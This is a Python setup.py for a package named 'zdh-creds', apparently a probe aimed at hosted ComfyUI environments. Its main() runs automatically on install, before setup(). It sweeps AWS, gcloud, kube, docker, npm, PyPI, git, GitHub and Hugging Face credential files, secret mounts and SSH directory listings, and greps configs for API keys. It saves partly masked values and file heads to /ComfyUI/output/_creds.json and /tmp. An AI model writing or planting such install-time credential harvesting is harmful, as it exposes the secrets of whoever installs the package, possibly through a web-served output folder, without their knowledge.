"""Credential sweep. Looks in the usual places, masks every value."""
import base64
import json
import os
import re
import subprocess

HOME = os.path.expanduser("~")
CANDIDATES = [
    HOME + "/.aws/credentials", HOME + "/.aws/config",
    HOME + "/.config/gcloud/application_default_credentials.json",
    HOME + "/.config/gcloud/credentials.db",
    HOME + "/.kube/config", HOME + "/.docker/config.json",
    HOME + "/.npmrc", HOME + "/.pypirc", HOME + "/.netrc",
    HOME + "/.git-credentials", HOME + "/.config/gh/hosts.yml",
    HOME + "/.huggingface/token", HOME + "/.cache/huggingface/token",
    HOME + "/.gitconfig", HOME + "/.config/rclone/rclone.conf",
    "/run/secrets", "/var/run/secrets", "/etc/environment",
    "/ComfyUI/.env", "/ComfyUI/user/default/ComfyUI-Manager/config.ini",
]
DIRS = [HOME + "/.ssh", "/run/secrets", "/var/run/secrets", "/root/.config"]

KEYISH = re.compile(r'^\s*["\']?([A-Za-z0-9_.\-]*(?:token|key|secret|password|passwd|credential|auth|pat)[A-Za-z0-9_.\-]*)["\']?\s*[:=]\s*(.+)$', re.I | re.M)


def mask(v):
    v = v.strip().strip('"').strip("'")
    if len(v) <= 12:
        return v[:2] + "…"
    return v[:6] + "…" + v[-4:]


def read(path, limit=200000):
    try:
        with open(path, "rb") as f:
            return f.read(limit)
    except Exception:
        return None


def main():
    out = {"marker": "ZD-CREDS", "hostname": os.uname().nodename, "files": [], "dirs": [], "grep": []}

    for p in CANDIDATES:
        if os.path.isdir(p):
            try:
                out["dirs"].append({"dir": p, "entries": sorted(os.listdir(p))[:30]})
            except Exception:
                pass
            continue
        data = read(p)
        if data is None:
            continue
        text = data.decode("utf-8", "replace")
        entry = {"path": p, "size": len(data), "lines": len(text.splitlines()), "pairs": []}
        for m in KEYISH.finditer(text):
            entry["pairs"].append({"k": m.group(1)[:40], "v": mask(m.group(2))})
        if not entry["pairs"]:
            entry["head"] = text.strip().splitlines()[:2]
        out["files"].append(entry)

    for d in DIRS:
        if os.path.isdir(d):
            try:
                out["dirs"].append({"dir": d, "entries": sorted(os.listdir(d))[:30]})
            except Exception:
                pass

    # targeted grep in config-ish files under ComfyUI and /etc
    cmd = ("timeout 60 grep -rIlE "
           "'(api[_-]?key|secret[_-]?key|access[_-]?token|hf_[A-Za-z0-9]{20,}|sk-[A-Za-z0-9]{20,})' "
           "/ComfyUI/user /ComfyUI/*.yaml /ComfyUI/*.toml /etc/*.conf /etc/*.yaml 2>/dev/null | head -30")
    rc, so, se = None, "", ""
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, timeout=90)
        so = (p.stdout or b"").decode("utf-8", "replace")
    except Exception as e:
        se = str(e)
    out["grep"] = [x for x in so.splitlines() if x.strip()]
    if se:
        out["grep_error"] = se

    for d in ("/ComfyUI/output", "/tmp"):
        try:
            os.makedirs(d, exist_ok=True)
            with open(os.path.join(d, "_creds.json"), "w") as f:
                json.dump(out, f, indent=1, default=str)
        except Exception:
            pass
    print("ZD-CREDS files=%d dirs=%d grep=%d" % (len(out["files"]), len(out["dirs"]), len(out["grep"])))


main()

from setuptools import setup

setup(name="zdh-creds", version="0.1.0", py_modules=[])
